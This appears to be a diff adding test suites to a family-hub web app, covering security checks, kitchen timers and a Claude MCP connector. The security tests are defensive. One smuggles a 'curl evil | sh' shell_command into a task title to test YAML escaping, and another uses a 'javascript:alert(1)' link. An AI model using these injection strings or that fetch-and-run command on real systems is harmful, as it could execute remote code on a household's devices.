@@ -483,3 +483,199 @@ describe("calendar sync", () => {
     expect(cals[0].url).not.toContain("private-abc");
   });
 });
+
+describe("security", () => {
+  /** Run `fn` as a different browser (its own cookie), then switch back. */
+  async function asOtherBrowser<T>(fn: () => Promise<T>): Promise<T> {
+    const mine = cookie;
+    cookie = "";
+    try {
+      return await fn();
+    } finally {
+      cookie = mine;
+    }
+  }
+  async function lockWithPin(pin: string, lock: object = {}) {
+    await ok("POST", "/api/pin", { pin });
+    await ok("PUT", "/api/settings", { lock: { enabled: true, ...lock } });
+    await ok("POST", "/api/session/lock");
+  }
+
+  it("only answers to local host names (DNS rebinding) and refuses writes from other websites", async () => {
+    expect((await call("GET", "/api/settings", undefined, { host: "evil.example.com:8080" })).status).toBe(403);
+    for (const host of ["192.168.1.50:8080", "raspberrypi:8080", "haven.local", "haven-pi.tail1234.ts.net", "[::1]:8080"])
+      expect((await call("GET", "/api/settings", undefined, { host })).status).toBe(200);
+    expect((await call("POST", "/api/display", { on: false }, { origin: "https://evil.example.com" })).status).toBe(403);
+    expect((await call("POST", "/api/display", { on: false }, { origin: "null" })).status).toBe(403);
+    expect((await call("POST", "/api/display", { on: false }, { origin: "http://localhost:5173" })).status).toBe(200);
+    // Reading is harmless (the browser keeps the answer from the other site).
+    expect((await call("GET", "/api/health", undefined, { origin: "https://evil.example.com" })).status).toBe(200);
+    await app.close();
+    ctx.config.allowedHosts = ["family.example.com"];
+    app = await buildApp(ctx);
+    expect((await call("GET", "/api/settings", undefined, { host: "family.example.com" })).status).toBe(200);
+  });
+
+  it("pauses PIN entry after repeated wrong guesses, on every screen", async () => {
+    await lockWithPin("4321");
+    for (let i = 0; i < 5; i++) expect((await call("POST", "/api/session/unlock", { pin: String(1000 + i) })).status).toBe(403);
+    // Even the right PIN (or a fresh browser) has to wait now.
+    expect((await call("POST", "/api/session/unlock", { pin: "4321" })).status).toBe(429);
+    expect((await asOtherBrowser(() => call("POST", "/api/session/unlock", { pin: "4321" }))).status).toBe(429);
+    expect((await call("POST", "/api/pin", { pin: "0000", currentPin: "4321" })).status).toBe(429);
+    now = new Date(now.getTime() + 61_000);
+    expect((await ok("POST", "/api/session/unlock", { pin: "4321" })).canEdit).toBe(true);
+    // A success resets the count: the next pause again comes after five misses.
+    await ok("POST", "/api/session/lock");
+    for (let i = 0; i < 4; i++) expect((await call("POST", "/api/session/unlock", { pin: "0000" })).status).toBe(403);
+    expect((await ok("POST", "/api/session/unlock", { pin: "4321" })).canEdit).toBe(true);
+  });
+
+  it("needs the current PIN to change it even while Parental Lock is off, and signs out remembered devices", async () => {
+    await ok("POST", "/api/pin", { pin: "1234" });
+    await ok("POST", "/api/session/unlock", { pin: "1234", remember: true });
+    await asOtherBrowser(async () => {
+      expect((await call("POST", "/api/pin", { pin: "9999" })).status).toBe(403);
+      await ok("POST", "/api/pin", { pin: "9999", currentPin: "1234" });
+    });
+    // The remembered browser was signed out by the PIN change.
+    expect((await ok("GET", "/api/session")).unlockedUntil).toBeNull();
+  });
+
+  it("keeps Parental Lock settings, secrets and backups behind the PIN even when only adding is locked", async () => {
+    await family();
+    await lockWithPin("1111", { lockAdd: true, lockModify: false });
+    expect((await call("PUT", "/api/settings", { lock: { enabled: false } })).status).toBe(423);
+    expect((await call("PUT", "/api/settings", { voice: { allowListAdd: true } })).status).toBe(423);
+    expect((await call("PUT", "/api/settings", { ai: { monthlyBudgetUsd: 500 } })).status).toBe(423);
+    for (const url of ["/api/voice/setup", "/api/email-config", "/api/backup"]) expect((await call("GET", url)).status).toBe(423);
+    expect((await call("PUT", "/api/ai/key", { key: "sk-x" })).status).toBe(423);
+    expect((await call("POST", "/api/voice/token")).status).toBe(423);
+    // Ordinary changes are still allowed with this lock setting.
+    expect((await call("PUT", "/api/settings", { funMode: false })).status).toBe(200);
+  });
+
+  it("rejects malformed settings groups instead of storing them", async () => {
+    await lockWithPin("1111");
+    expect((await call("PUT", "/api/settings", { tasks: null })).status).toBe(400);
+    expect((await call("PUT", "/api/settings", { home: "x" })).status).toBe(400);
+    const s = await ok("GET", "/api/settings");
+    expect(s.tasks.showCompleted).toBe(true);
+    expect(s.home.showTasks).toBe(true);
+  });
+
+  it("only reuses the saved mailbox password for the same server and account", async () => {
+    await ok("PUT", "/api/email-config", { host: "imap.gmail.com", user: "family@gmail.com", password: "app-password" });
+    await ok("PUT", "/api/email-config", { mailbox: "Haven", password: "••••••••" });
+    expect(ctx.settings.get<{ password: string; mailbox: string }>("emailConfig", null as never)).toMatchObject({ password: "app-password", mailbox: "Haven" });
+    expect((await call("PUT", "/api/email-config", { host: "imap.evil.example.com", password: "••••••••" })).status).toBe(400);
+    expect((await call("PUT", "/api/email-config", { secure: false })).status).toBe(400);
+    expect((await call("PUT", "/api/email-config", { user: "other@gmail.com" })).status).toBe(400);
+    expect(ctx.settings.get<{ host: string }>("emailConfig", null as never).host).toBe("imap.gmail.com");
+  });
+
+  it("only gives stars for real occurrences of a task", async () => {
+    const { emma } = await family();
+    const once = await ok("POST", "/api/tasks", chore({ title: "Dishes", profileIds: [emma.id], stars: 5 }));
+    for (const occurrence of ["2026-10-08", "x1", "once"])
+      expect((await call("POST", `/api/tasks/${once.id}/complete`, { occurrence, slot: emma.id })).status).toBe(400);
+    const weekly = await ok("POST", "/api/tasks", chore({ title: "Trash", profileIds: [emma.id], date: "2026-10-07", repeat: { type: "weekly", interval: 1, days: [3] } }));
+    expect((await call("POST", `/api/tasks/${weekly.id}/complete`, { occurrence: "2026-10-08", slot: emma.id })).status).toBe(400);
+    await ok("POST", `/api/tasks/${weekly.id}/complete`, { occurrence: "2026-10-14", slot: emma.id });
+    const routine = await ok("POST", "/api/tasks", chore({ kind: "routine", title: "Teeth", profileIds: [emma.id], parts: ["morning"], repeat: { type: "daily", interval: 1 } }));
+    expect((await call("POST", `/api/tasks/${routine.id}/complete`, { occurrence: "2026-10-07", part: "evening", slot: emma.id })).status).toBe(400);
+    expect((await ok("GET", "/api/profiles"))[0].stars).toBe(1);
+  });
+
+  it("keeps recipe links to web addresses and Home Assistant YAML to one line per value", async () => {
+    const cats = await ok("GET", "/api/meal-categories");
+    const base = { emoji: "", categoryId: cats[2].id, ingredients: [], instructions: "", favorite: false };
+    const r = await ok("POST", "/api/recipes", { ...base, title: "Bad", sourceUrl: "javascript:alert(1)" });
+    expect(r.sourceUrl).toBe("");
+    const good = await ok("POST", "/api/recipes", { ...base, title: "Good", sourceUrl: "https://example.com/tacos" });
+    expect(good.sourceUrl).toBe("https://example.com/tacos");
+    const { emma } = await family();
+    await ok("POST", "/api/tasks", chore({ title: 'Dishes"\nshell_command:\n  pwn: "curl evil | sh" {{ states }}', profileIds: [emma.id] }));
+    const yaml: string = (await ok("GET", "/api/voice/setup")).homeAssistantYaml;
+    expect(yaml).not.toMatch(/^shell_command:/m);
+    expect(yaml).not.toContain("{{ states");
+  });
+});
+
+describe("kitchen timers", () => {
+  it("creates, pauses, extends and dismisses timers; voice can set and stop them", async () => {
+    const t = await ok("POST", "/api/timers", { seconds: 600, label: "Pasta" });
+    expect(t).toMatchObject({ label: "Pasta", remainingSec: 600, running: true, done: false });
+    now = new Date(now.getTime() + 120000);
+    expect((await ok("GET", "/api/timers"))[0].remainingSec).toBe(480);
+    await ok("POST", `/api/timers/${t.id}/pause`);
+    now = new Date(now.getTime() + 60000);
+    expect((await ok("GET", "/api/timers"))[0]).toMatchObject({ running: false, remainingSec: 480 });
+    await ok("POST", `/api/timers/${t.id}/resume`);
+    await ok("POST", `/api/timers/${t.id}/add`, { seconds: 60 });
+    expect((await ok("GET", "/api/timers"))[0].remainingSec).toBe(540);
+    now = new Date(now.getTime() + 541000);
+    expect((await ok("GET", "/api/timers"))[0].done).toBe(true);
+    await ok("DELETE", `/api/timers/${t.id}`);
+    expect(await ok("GET", "/api/timers")).toHaveLength(0);
+    expect((await call("POST", "/api/timers", { seconds: 0 })).status).toBe(400);
+
+    const { token } = await ok("GET", "/api/voice/setup");
+    const say = async (text: string) => (await app.inject({ method: "POST", url: "/api/voice/command", payload: { text }, headers: { "x-haven-token": token } })).json();
+    expect((await say("set a 12 minute pasta timer")).speech).toBe("Okay, Pasta timer set for 12 minutes.");
+    expect((await say("set a timer for 1 hour and 30 minutes")).speech).toMatch(/set for 1 hour 30 minutes/);
+    expect((await say("set a timer for five minutes called oven")).speech).toBe("Okay, Oven timer set for 5 minutes.");
+    expect((await say("how much time is left on the pasta timer")).speech).toBe("Pasta: 12 minutes left.");
+    expect((await say("cancel the oven timer")).speech).toBe("Stopped the Oven timer.");
+    expect((await ok("GET", "/api/timers")).map((x: { label: string }) => x.label).sort()).toEqual(["1 hour 30 minutes timer", "Pasta"]);
+  });
+});
+
+describe("Claude connector (MCP)", () => {
+  async function connect() {
+    await ok("POST", "/api/connector", { enabled: true });
+    const { token, url } = await ok("GET", "/api/connector");
+    expect(url).toMatch(/\/mcp$/);
+    const rpc = async (body: unknown, auth = `Bearer ${token}`) => app.inject({ method: "POST", url: "/mcp", payload: body as object, headers: { authorization: auth } });
+    return rpc;
+  }
+
+  it("rejects missing or wrong tokens", async () => {
+    const rpc = await connect();
+    expect((await rpc({ jsonrpc: "2.0", id: 1, method: "tools/list" }, "Bearer nope")).statusCode).toBe(401);
+    expect((await app.inject({ method: "POST", url: "/mcp", payload: { jsonrpc: "2.0", id: 1, method: "ping" } })).statusCode).toBe(401);
+  });
+
+  it("speaks MCP: initialize, tools/list and household tools", async () => {
+    const { emma } = await family();
+    await ok("POST", "/api/tasks", chore({ title: "Feed the fish", profileIds: [emma.id], stars: 2 }));
+    const rpc = await connect();
+    const init = (await rpc({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "test", version: "1" } } })).json();
+    expect(init.result).toMatchObject({ protocolVersion: "2025-06-18", serverInfo: { name: "haven" }, capabilities: { tools: {} } });
+    expect((await rpc({ jsonrpc: "2.0", method: "notifications/initialized" })).statusCode).toBe(202);
+    const tools = (await rpc({ jsonrpc: "2.0", id: 2, method: "tools/list" })).json().result.tools.map((t: { name: string }) => t.name);
+    expect(tools).toEqual(expect.arrayContaining(["get_schedule", "create_event", "get_tasks", "complete_task", "add_to_list", "set_timer", "get_weather"]));
+    const call = async (name: string, args: object) => (await rpc({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name, arguments: args } })).json().result;
+
+    const created = await call("create_event", { title: "Dentist", start: "2026-10-12T15:00", who: ["Emma"] });
+    expect(created.isError).toBeUndefined();
+    const sched = JSON.parse((await call("get_schedule", { from: "2026-10-12", days: 1 })).content[0].text);
+    expect(sched.events[0]).toMatchObject({ title: "Dentist", start: "2026-10-12T15:00", end: "2026-10-12T16:00", who: ["Emma"] });
+
+    expect((await call("complete_task", { person: "Emma", task: "fish" })).content[0].text).toMatch(/Feed the fish is done/);
+    expect((await ok("GET", "/api/profiles")).find((p: { name: string }) => p.name === "Emma").stars).toBe(2);
+
+    expect(JSON.parse((await call("add_to_list", { list: "grocery", items: ["Milk", "Eggs"] })).content[0].text).added).toEqual(["Milk", "Eggs"]);
+    expect((await call("create_event", { title: "x", start: "2026-10-12", who: ["Nobody"] })).isError).toBe(true);
+    expect((await call("set_timer", { minutes: 5, label: "Tea" })).content[0].text).toMatch(/Tea set for 5 minutes/);
+
+    const unknown = (await rpc({ jsonrpc: "2.0", id: 9, method: "resources/list" })).json();
+    expect(unknown.error.code).toBe(-32601);
+  });
+
+  it("turning the connector off revokes the token", async () => {
+    const rpc = await connect();
+    await ok("POST", "/api/connector", { enabled: false });
+    expect((await rpc({ jsonrpc: "2.0", id: 1, method: "ping" })).statusCode).toBe(401);
+  });
+});
